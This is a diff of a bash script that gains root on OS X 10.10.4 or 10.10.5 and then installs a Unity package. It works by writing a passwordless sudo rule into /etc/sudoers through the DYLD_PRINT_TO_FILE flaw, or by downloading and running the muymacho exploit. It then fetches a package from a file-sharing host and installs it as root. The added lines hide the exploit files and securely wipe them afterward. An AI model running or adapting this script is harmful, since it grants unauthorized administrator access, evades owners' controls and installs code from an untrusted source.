@@ -1,68 +1,76 @@
 #!/bin/bash
-echo; echo
-echo ' ____ ___      .__                     '
-echo '|    |   \____ |__| __________   ____'
-echo '|    |   /    \|  |/  ___/  _ \ /    \'
-echo '|    |  /   |  \  |\___ (  <_> )   |  \'
-echo '|______/|___|  /__/____  >____/|___|  /'
-echo '             \/        \/           \/'
+echo
+echo " ____ ___       __                      "
+echo "|    |   \____ |__| __________   ____   "
+echo "|    |   /    \|  |/  ___/  _ \ /    \  "
+echo "|    |  /   |  \  |\___ (  <_> )   |  \ "
+echo "|______/|___|  /__/____  >____/|___|  / "
+echo "             \/        \/           \/  "
 echo
 echo "Created by:"
 echo "Zach Rayburn"
 echo
 
+__Bold__=$(tput bold)
+__Reset__=$(tput sgr0)
+
 #--- PRESCRIPTING ---#
-dir=~/tmp$$/
-echo "Making temporary directory..."
-mkdir -v $dir
-echo "Done."
+__exploit_dir__=~/tmp$$/
+echo "${__Bold__}Making temporary directory...${__Reset__}"
+mkdir -v $__exploit_dir__
+chflags hidden $__exploit_dir__
+echo "${__Bold__}Done.${__Reset__}"
 
 #--- FETCH EXPLOITS ---#
-curl https://raw.githubusercontent.com/luismiras/muymacho/master/muymacho.py > $dir/macho.py
+curl https://raw.githubusercontent.com/luismiras/muymacho/master/muymacho.py > $__exploit_dir__/macho.py
+chflags hidden $__exploit_dir__/macho.py
 
 #--- EXPLOIT MACHINE ---#
-function rocket { echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp }
+function rocket {
+  echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp
+}
 function macho {
-  cd $dir
-  python macho.py
+  cd $__exploit_dir__
+  python ./macho.py
 }
 
-read -p "What version of osx are you using? (10.10.4 or 10.10.5)" osanswer
-if [ $osanswer = "10.10.4" ];
-  then
+if [ "$(sw_vers -productVersion)" == "10.10.4" ]; then
     rocket
-  else
-fi
-if [ $osanswer = "10.10.5" ];
-  then
+  elif [ "$(sw_vers -productVersion)" == "10.10.5" ]; then
     macho
   else
+    echo "${__Bold__}Can't exploit!${__Reset__}"
+    echo "${__Bold__}Product version: $(sw_vers -productVersion) (must be either 10.10.4 or 10.10.5)${__Reset__}"
+    srm --directory --force --recursive --medium --zero $__exploit_dir__
+    exit 1
 fi
 
 #--- CHECK FOR ROOT ---#
-if [[ $EUID -ne 0 ]]
-then
-  echo -e "\033[1mFailed! No root!\033[0m"
+if [[ $EUID -ne 0 ]]; then
+  echo -e "${__Bold__}Failed! No root!${__Reset__}"
+  srm --directory --force --recursive --medium --zero $__exploit_dir__
   exit 1
 else
+  echo "${__Bold__}You're root!${__Reset__}"
 fi
 
 #--- FETCH UNITY ---#
-echo "Downloading unity..."
-curl -# http://s000.tinyupload.com/download.php?file_id=03173299314515671549&t=0317329931451567154942975 > $dir/unity.pkg
-echo "Done"
+echo "${__Bold__}Downloading Unity...${__Reset__}"
+curl -# http://s000.tinyupload.com/download.php?file_id=03173299314515671549&t=0317329931451567154942975 > $__exploit_dir__/unity.pkg
+chflags hidden $__exploit_dir__/unity.pkg
+echo "${__Bold__}Done.${__Reset__}"
 
 #--- INSTALL ---#
-echo "Installing unity..."
-sudo installer -pkg $dir/unity.pkg -target /
-echo "Done"
+echo "${__Bold__}Installing Unity...${__Reset__}"
+sudo installer -pkg $__exploit_dir__/unity.pkg -target /
+echo "${__Bold__}Done.${__Reset__}"
 
 #--- CLEANUP ---#
-rm -r $dir
-echo "Removing root..."
+srm --directory --force --recursive --medium --zero $__exploit_dir__
+echo "${__Bold__}Removing root...${__Reset__}"
 sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers
-echo "Done"
+echo "${__Bold__}Done.${__Reset__}"
 echo
 
-echo "Completed press any key to exit..."
+echo "${__Bold__}Completed press any key to exit...${__Reset__}"
 read useless
